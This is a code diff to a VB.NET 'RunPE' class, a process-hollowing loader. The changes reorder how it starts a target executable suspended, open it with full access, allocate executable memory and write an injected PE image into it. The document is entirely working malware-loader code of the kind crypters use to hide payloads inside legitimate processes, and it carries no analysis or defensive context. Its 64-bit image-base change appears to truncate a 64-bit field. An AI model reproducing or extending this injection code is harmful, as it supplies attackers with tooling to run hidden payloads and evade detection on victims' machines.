@@ -13,6 +13,13 @@ Public Class RunPE
     End Enum
     Public Shared Function Start(lpBuffer() As Byte, targetexe As String) As Boolean
 
+        Dim si As New STARTUPINFO()
+        Dim pi As New PROCESS_INFORMATION()
+        Dim hRet = CreateProcess(targetexe, 0, 0, IntPtr.Zero, False, CREATE_SUSPENDED, IntPtr.Zero, Nothing, si, pi)
+        If hRet = False Then
+            GoTo retexit
+        End If
+        Dim hHandle = OpenProcess(PROCESS_ALL_ACCESS Or PROCESS_VM_OPERATION Or PROCESS_VM_READ Or PROCESS_VM_WRITE, False, pi.dwProcessId)
 
         Dim baseAddress As IntPtr = Marshal.AllocHGlobal(lpBuffer.Length)
         Marshal.Copy(lpBuffer, 0, baseAddress, lpBuffer.Length)
@@ -43,22 +50,18 @@ Public Class RunPE
             AddressOfEntryPoint = ntHeaders32.OptionalHeader.AddressOfEntryPoint
         Else
             Dim ntHeaders64 As IMAGE_NT_HEADERS64 = Marshal.PtrToStructure(nt_header_ptr, GetType(IMAGE_NT_HEADERS64))
-            pImageBase = New IntPtr(ntHeaders64.OptionalHeader.ImageBase)
+            Dim dwPEHeaderAddress As Integer = BitConverter.ToInt32(lpBuffer, &H3C)
+            pImageBase = New IntPtr(BitConverter.ToInt32(lpBuffer, dwPEHeaderAddress + &H30))
             ImageBase64 = ntHeaders64.OptionalHeader.ImageBase
             SizeOfImage = ntHeaders64.OptionalHeader.SizeOfImage
             SizeOfHeaders = ntHeaders64.OptionalHeader.SizeOfHeaders
             NumberOfSections = ntHeaders64.FileHeader.NumberOfSections
             AddressOfEntryPoint = ntHeaders64.OptionalHeader.AddressOfEntryPoint
+
         End If
 
 
-        Dim si As New STARTUPINFO()
-        Dim pi As New PROCESS_INFORMATION()
-        Dim hRet = CreateProcess(targetexe, 0, 0, IntPtr.Zero, False, CREATE_SUSPENDED, IntPtr.Zero, Nothing, si, pi)
-        If hRet = False Then
-            GoTo retexit
-        End If
-        Dim hHandle = OpenProcess(PROCESS_ALL_ACCESS Or PROCESS_VM_OPERATION Or PROCESS_VM_READ Or PROCESS_VM_WRITE, False, pi.dwProcessId)
+
 
         If VirtualAllocEx(hHandle, pImageBase, SizeOfImage, MEM_RESERVE Or MEM_COMMIT, PAGE_EXECUTE_READWRITE) = IntPtr.Zero Then
             GoTo retexit
@@ -67,6 +70,8 @@ Public Class RunPE
         If Not WriteProcessMemory(hHandle, pImageBase, baseAddress, SizeOfHeaders, IntPtr.Zero) Then
             GoTo retexit
         End If
+
+
 
         If machineUint = &H14C Then
             For i = 0 To NumberOfSections - 1
